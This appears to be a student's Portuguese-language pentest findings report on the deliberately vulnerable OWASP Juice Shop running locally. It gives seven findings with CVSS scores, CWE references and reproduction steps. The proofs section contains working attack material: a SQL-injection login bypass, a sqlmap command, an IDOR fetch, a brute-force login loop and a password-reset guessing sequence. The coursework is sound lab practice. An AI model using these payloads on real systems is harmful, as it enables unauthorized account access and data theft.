# Tabela de achados (Seção 7.3 do roteiro)

Faixas CVSS: None 0.0 · Low 0.1–3.9 · Medium 4.0–6.9 · High 7.0–8.9 · Critical 9.0–10.0.
Calculadora oficial: https://www.first.org/cvss/calculator/3.1
Vetores CVSS completos e evidências estão em "Provas reprodutíveis", abaixo da tabela.

| ID  | Achado                                                | OWASP | CWE            | Severidade      | Impacto (CID / LGPD)                          |
| --- | ------------------------------------------------------ | ----- | --------------- | ---------------- | ---------------------------------------------- |
| V1  | SQLi no login (`' OR 1=1--`)                           | A03   | CWE-89          | **9.1 Crítico**  | Confid. e integr.; risco de violação em massa  |
| V2  | Senha (hash MD5) exposta no payload do JWT             | A02   | CWE-522, CWE-916 | **6.5 Médio** \* | Confid.; credencial de autenticação            |
| V3  | IDOR na cesta (`/rest/basket/{id}`)                     | A01   | CWE-639         | **6.5 Médio**    | Confid.; dado pessoal de terceiro              |
| V4  | Erro verboso expõe framework/versão; CSP/HSTS ausentes | A05   | CWE-209, CWE-16 | **5.3 Médio**    | Confid. (reconhecimento)                       |
| V5  | Listagem de diretório em `/ftp/` expõe doc. confidencial | A05 | CWE-548         | **7.5 Alto**     | Confid.                                        |
| V6  | Login sem bloqueio contra força bruta                  | A07   | CWE-307         | **6.5 Médio**    | Confid. e integr.; acesso indevido à conta       |
| V7  | Redefinição de senha via pergunta de segurança sem limite de tentativas | A04 | CWE-640 | **9.1 Crítico** | Confid. e integr.; takeover completo da conta   |

\* Ver nota de metodologia sobre V2 logo abaixo da tabela: o vetor original (7.5) permanece válido como leitura encadeada a partir de V1, e o vetor aqui (6.5) é a pontuação do achado avaliado isoladamente. Registramos os dois, ver "Provas reprodutíveis".

Cobertura mínima do roteiro (6 categorias distintas, com A01/A02/A03 obrigatórias): **atingida**. V1–V7 cobrem seis categorias distintas (A01, A02, A03, A04, A05, A07), com as três obrigatórias confirmadas. A06 foi investigada e não gerou achado (ver V4); A08, A09 e A10 ainda não foram investigadas.

---

## Nota de metodologia (V2): por que dois vetores CVSS aparecem para o mesmo achado

A evidência original (ver `evidencias/image-3.png`) decodifica o JWT **do administrador**, obtido encadeado a partir do bypass de SQL Injection (V1). Nesse caminho, nenhuma conta própria é necessária, daí a métrica de privilégio `PR:N` e o score 7.5.

A prova de conceito complementar (`scripts/v2_hash_senha_jwt.py`) reproduz a mesma falha de forma independente de V1: registra uma conta de teste comum e decodifica o próprio JWT dela. Avaliado assim, isoladamente, é necessário ter uma conta (qualquer uma) para obter um token e analisá-lo, o que corresponde a `PR:L` e score 6.5.

A prática recomendada de CVSS é pontuar cada vulnerabilidade por seus próprios pré-requisitos mínimos, sem presumir que outra vulnerabilidade já foi explorada. Por isso adotamos **6.5 (PR:L)** como o vetor de referência de V2 no relatório, citando o encadeamento com V1 como agravante narrativo (quando V1 já foi explorado, a obtenção do hash do administrador não exige mais nenhuma conta própria, o que eleva o risco combinado na prática).

---

## Provas reprodutíveis

**V1: SQLi no login (A03).**
Vetor: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = 9.1 Crítico. Validado na calculadora oficial do FIRST (`evidencias/cvss_p1.png`).
Campo e-mail = `' OR 1=1--`, senha qualquer. Autentica como `admin@juice-sh.op` sem saber a senha.

- CWE-89 (Improper Neutralization of Special Elements used in an SQL Command), confirmado em `cwe.mitre.org/data/definitions/89.html`.
- Evidência original: `evidencias/image-1.png` (requisição), `evidencias/image-2.png` (token retornado).
- Evidência complementar (requisição/resposta em texto, reproduzível): `evidencias/V1-sqli-login/http/`.
- Confirmação independente por sqlmap (injeção booleana cega no parâmetro `email`, SGBD identificado como SQLite):
  ```
  sqlmap -u "http://127.0.0.1:3000/rest/user/login" \
    --data='{"email":"test@test.com","password":"test"}' \
    --headers="Content-Type: application/json" \
    -p email --batch --level 3 --risk 2 --ignore-code=401
  ```
- Script reprodutível: `python -m scripts.v1_sqli_login`.

**V2: Senha em MD5 vazada no JWT (A02).**
Vetor de referência: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = 6.5 Médio (isolado); `PR:N` = 7.5 Alto quando encadeado a partir de V1. Ver nota de metodologia acima. Ambas as leituras validadas na calculadora oficial do FIRST (`evidencias/cvss_p2.png` para a isolada, `evidencias/cvss_v2_encadeado.png` para a encadeada).

O token retornado no login carrega o campo `password`. Decodificando o payload (Base64) do JWT:

```
{"data":{"id":1,"email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500", bid...}}
```

Confirmação de que o hash é MD5 de uma senha trivial:

```
$ printf '%s' 'admin123' | md5sum
0192023a7bbd73250516f069df18b500   <- idêntico ao hash no token JWT
```

- CWE-522 (Insufficiently Protected Credentials), pois o hash é desnecessariamente enviado ao cliente e persistido no `localStorage`. CWE-916 (Use of Password Hash With Insufficient Computational Effort), MD5 sem sal, citado como exemplo direto na própria definição do CWE. Ambos confirmados em `cwe.mitre.org`; substituem a referência inicial a CWE-327/311 (mais genérica), por descreverem com mais precisão o comportamento observado.
- Evidência original: `evidencias/image-3.png` (jwt.io, token do administrador).
- Evidência complementar (conta de teste própria, com verificação MD5 automatizada): `evidencias/V2-hash-senha-jwt/` (par requisição/resposta em `http/`, decodificação e comparação de hash em `analise-jwt.txt`).
- Script reprodutível: `python -m scripts.v2_hash_senha_jwt`.

**V3: IDOR na cesta (A01).**
Vetor: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = 6.5 Médio. Vetor idêntico ao de V2 isolado; validado no mesmo print (`evidencias/cvss_p2.png`).
Autenticado como user 1, no Console do navegador:

```javascript
fetch("/rest/basket/2", {
  headers: { Authorization: "Bearer " + localStorage.getItem("token") },
})
  .then((r) => r.json())
  .then(console.log);
// Retorna (cesta de OUTRO usuário)
```

Sem o cabeçalho `Authorization` o servidor responde 401 (esperado);
Adicionando meu token de usuário pedindo recurso, deveria responder 403, mas responde 200 daí o controle de acesso quebrado.

- CWE-639 (Authorization Bypass Through User-Controlled Key), confirmado em `cwe.mitre.org/data/definitions/639.html`. É o CWE mais específico entre os dois citados originalmente (639/284); CWE-284 é a categoria pai, mais genérica.
- Evidência original: `evidencias/image-4.png` (console do navegador).
- Evidência complementar (duas contas de teste isoladas, sem depender de sessão logada manualmente): `evidencias/V3-idor-cesta/http/`.
- Script reprodutível: `python -m scripts.v3_idor_cesta`.

**V4: Erro verboso expõe framework/versão; CSP e HSTS ausentes (A05).**
Vetor: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` = 5.3 Médio. Validado na calculadora oficial do FIRST (`evidencias/cvss_v4.png`).

Um cabeçalho `Authorization` mal formado provoca uma página de erro completa (não uma mensagem genérica), revelando `OWASP Juice Shop (Express ^4.22.1)`. Nenhuma resposta testada inclui `Content-Security-Policy` ou `Strict-Transport-Security`.

```bash
curl -i http://127.0.0.1:3000/rest/basket/1 -H "Authorization: BearerSemEspaco"
curl -I http://127.0.0.1:3000/   # confirma ausência de CSP/HSTS
```

- CWE-209 (Generation of Error Message Containing Sensitive Information) e CWE-16 (Configuration, citado como típico de A05 pelo próprio roteiro), confirmados em `cwe.mitre.org`.
- Sinalizado de forma independente pela varredura passiva do OWASP ZAP (`zap-baseline.py`), categoria "CSP Header Not Set" [10038].
- Evidência: `evidencias/V4-erro-verboso-headers/http/` e `.../ferramentas/`.
- A versão do Express exposta (4.22.1) foi correlacionada com a base de CVEs conhecidos: já corrige os problemas recentes relevantes do framework (open redirect, XSS refletido, ReDoS, poluição de protótipo via query parser, todos corrigidos até a versão 4.22.0). Não gerou achado confirmado para A06: categoria investigada, sem confirmação, não "não aplicável".

**V5: Listagem de diretório em `/ftp/` expõe documento confidencial (A05).**
Vetor: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = 7.5 Alto. Vetor idêntico ao de V2 encadeado; validado no mesmo print (`evidencias/cvss_v2_encadeado.png`).

`GET /ftp/` retorna uma listagem completa de arquivos. De sete arquivos listados, três são baixáveis sem autenticação; um deles (`acquisitions.md`) começa com "This document is confidential! Do not distribute!".

```bash
curl http://127.0.0.1:3000/ftp/                    # listagem
curl http://127.0.0.1:3000/ftp/acquisitions.md      # HTTP 200, conteúdo confidencial
```

- CWE-548 (Exposure of Information Through Directory Listing), confirmado em `cwe.mitre.org/data/definitions/548.html`.
- Evidência: `evidencias/V5-listagem-diretorio-ftp/http/` (listagem e os dois arquivos baixados).

**V6: Login sem bloqueio contra força bruta (A07).**
Vetor: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` = 6.5 Médio. Validado na calculadora oficial do FIRST (`evidencias/cvss_v6.png`).

Uma conta de teste foi registrada e submetida a quinze tentativas consecutivas de login com senha incorreta, sem qualquer atraso entre elas. Todas as quinze retornaram HTTP 401, sem nenhum código de bloqueio (403 ou 429). Imediatamente depois, o login com a senha correta teve sucesso (HTTP 200), confirmando que a conta nunca foi bloqueada ou colocada em espera.

```bash
for i in $(seq 1 15); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST http://127.0.0.1:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"<conta-de-teste>\",\"password\":\"senhaErrada$i\"}"
done
```

- CWE-307 (Improper Restriction of Excessive Authentication Attempts), confirmado em `cwe.mitre.org/data/definitions/307.html`: "The product does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame."
- Evidência: `evidencias/V6-bruteforce-login/http/` (15 tentativas incorretas mais a tentativa final correta, cada uma como par requisição/resposta).
- Script reprodutível: `python -m scripts.v6_bruteforce_login`.

**V7: Redefinição de senha via pergunta de segurança sem limite de tentativas (A04).**
Vetor: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = 9.1 Crítico. Vetor idêntico ao de V1; validado no mesmo print (`evidencias/cvss_p1.png`).

O endpoint `GET /rest/user/security-question?email=<email>` devolve, sem qualquer autenticação, qual pergunta de segurança está associada a um e-mail (no caso testado, "Your eldest siblings middle name?"). O endpoint `POST /rest/user/reset-password` aceita um número ilimitado de tentativas de resposta, sem bloqueio. Uma conta de teste foi criada com uma resposta comum; testando uma lista pequena de nomes prováveis (`Michael`, `David`, `James`, `Robert`, `John`), a quinta tentativa acertou, a senha foi redefinida e o login com a nova senha teve sucesso imediato.

```bash
curl "http://127.0.0.1:3000/rest/user/security-question?email=<email>"
curl -X POST http://127.0.0.1:3000/rest/user/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"<email>","answer":"John","new":"SenhaForjada#2","repeat":"SenhaForjada#2"}'
```

- CWE-640 (Weak Password Recovery Mechanism for Forgotten Password), confirmado em `cwe.mitre.org/data/definitions/640.html`, que recomenda explicitamente limitar tentativas incorretas de resposta e desativar a recuperação após um pequeno número de erros, medida ausente neste fluxo.
- Evidência: `evidencias/V7-reset-senha-pergunta-seguranca/http/` (consulta da pergunta, as cinco tentativas de resposta e o login com a senha forjada).
- Script reprodutível: `python -m scripts.v7_reset_senha_pergunta_seguranca`.
- Observação de escopo: a associação da resposta de segurança a uma conta exige uma chamada separada do cadastro (`POST /api/SecurityAnswers/` com o `UserId` explícito), passo que a interface web executa automaticamente e que precisou ser descoberto por engenharia reversa da API para a prova de conceito funcionar.

**Descoberta do fluxo real de associação (relevante para reprodutibilidade).** A primeira tentativa seguiu o padrão usado no cadastro dos demais achados (campos `securityQuestion`/`securityAnswer` dentro do próprio `POST /api/Users`) e falhou em silêncio: a conta era criada normalmente, mas a pergunta de segurança nunca ficava consultável.

```bash
# Tentativa 1: campos de segurança dentro do proprio cadastro
curl -X POST http://127.0.0.1:3000/api/Users -H "Content-Type: application/json" \
  -d '{"email":"...","password":"...","passwordRepeat":"...","securityQuestion":{"id":1},"securityAnswer":"John"}'
# -> HTTP 201, conta criada, mas os campos de seguranca sao ignorados pelo endpoint

curl "http://127.0.0.1:3000/rest/user/security-question?email=..."
# -> {} (nenhuma pergunta associada)
```

Inspecionando o endpoint `POST /api/SecurityAnswers/` isoladamente, com apenas `SecurityQuestionId` e `answer`, a chamada retornava sucesso (`HTTP 201`), mas o registro criado trazia `"UserId":null`, órfão, sem vínculo com nenhuma conta. Somente ao autenticar como o usuário recém-criado e enviar o `UserId` explicitamente no corpo da chamada é que a associação passou a existir de fato:

```bash
# Tentativa 2 (funcional): associacao explicita, autenticada, apos o login
curl -X POST http://127.0.0.1:3000/api/SecurityAnswers/ -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token do usuario recem-criado>" \
  -d '{"SecurityQuestionId":1,"answer":"John","UserId":32}'
# -> HTTP 201, {"...,"UserId":32}

curl "http://127.0.0.1:3000/rest/user/security-question?email=..."
# -> {"question":{"id":1,"question":"Your eldest siblings middle name?",...}}
```

Esse é o mesmo fluxo de duas chamadas que a interface web do Juice Shop executa automaticamente ao cadastrar uma conta pelo navegador, apenas não documentado para quem consome a API diretamente. Sem essa descoberta, a prova de conceito de V7 teria uma conta de teste sem pergunta de segurança configurada, e o achado pareceria não reproduzível.

- Teste negativo realizado: a partir da descoberta acima, testou-se a hipótese de um usuário autenticado conseguir sobrescrever a resposta de segurança de **outra** conta, enviando o `UserId` da vítima com o próprio token (um padrão de mass assignment/IDOR). O teste registrou uma conta vítima com resposta de segurança já configurada e, em seguida, uma conta atacante tentou associar uma nova resposta ao `UserId` da vítima. A API rejeitou a tentativa com `HTTP 400` e a mensagem `"UserId must be unique"`, e o reset de senha subsequente com a resposta forjada falhou como esperado (`HTTP 401`). A hipótese foi descartada: não é possível sequestrar uma conta que já possui resposta de segurança configurada por essa rota, porque o campo `UserId` tem restrição de unicidade no banco. O achado V7 permanece válido apenas para o cenário já demonstrado, adivinhação da resposta em contas cuja resposta ainda não foi definida ou é fraca o suficiente para ser adivinhada.

---

## Origem dos achados

Os três primeiros achados (V1–V3) foram **apontados/exemplificados pelo próprio roteiro e em aula pelo professor**, já que o roteiro é um guia. A contribuição da equipe foi em reproduzir, classificar e, na revisão desta seção, validar cada CWE diretamente na base do MITRE e justificar cada métrica do vetor CVSS. V4 e V5 partiram de sinais observados durante a preparação das ferramentas (página de erro provocada deliberadamente, varredura passiva do ZAP e listagem de diretório encontrada por navegação direta), não de exemplos do roteiro.

- **V1 (A03):** o roteiro traz `' OR 1=1 --` como payload de exemplo e a linha de `sqlmap`.
- **V3 (A01):** o roteiro cita textualmente `/rest/basket/{id}` e "trocar o ID na URL".
- **V2 (A02):** o roteiro lista "algoritmos fracos (MD5, DES)" e "procure hashes/segredos expostos".
- **V4 e V5 (A05):** o roteiro cita "mensagens de erro verbosas" e "diretórios expostos" como exemplos da categoria; a equipe identificou as duas instâncias concretas no alvo.
- **V6 (A07):** o roteiro cita "força bruta sem bloqueio" como exemplo direto da categoria; a equipe confirmou a ausência de bloqueio com uma sequência controlada de tentativas.
- **V7 (A04):** o roteiro cita "fluxo de recuperação de senha fraco" como exemplo da categoria; a equipe identificou e explorou a fraqueza concreta no fluxo de pergunta de segurança do Juice Shop.

## Escopo e divisão de trabalho

- **Exigência do roteiro (Seção 4):** mínimo **6 categorias distintas**, obrigatórias **A01, A02, A03**.
- **Confirmado (V1–V7):** as 3 categorias obrigatórias, mais A05 (duas instâncias), A07 e A04, totalizando 6 categorias distintas confirmadas, todas com evidência, script reprodutível, CWE validado no MITRE, CVSS justificado por métrica e relação com CID/LGPD. Cobertura mínima atingida.
- **Investigada sem achado:** A06, por ausência de CVE aplicável à versão do Express identificada.
- **Ainda não investigadas:** A08, A09 e A10. Não contam como "não aplicáveis", porque essa classificação exige tentativa de investigação registrada, o que ainda não ocorreu para essas três categorias.
